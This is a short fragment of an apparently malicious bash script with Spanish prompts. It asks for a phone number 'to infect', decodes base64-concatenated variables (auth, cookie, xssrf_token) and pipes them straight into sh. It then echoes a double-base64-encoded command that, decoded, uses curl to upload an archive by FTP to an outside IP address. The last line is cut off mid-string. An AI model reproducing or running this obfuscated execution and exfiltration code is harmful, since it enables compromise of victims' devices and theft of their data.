...
function servidor(){
        ...
        read -p "ingrese numero a infectar sin el simbolo de +: " numero
         echo $auth$cookie$xssrf_token | base64 -d | sh
         echo "WTNWeWJDQXRkaUF0VkNBa1lYQnZaRzh1ZEdGeUxtZDZJR1owY0Rvdkx6RTNNaTQ1TXk0eE1qa3VNakV4T2pJeElDMHRkW                    >
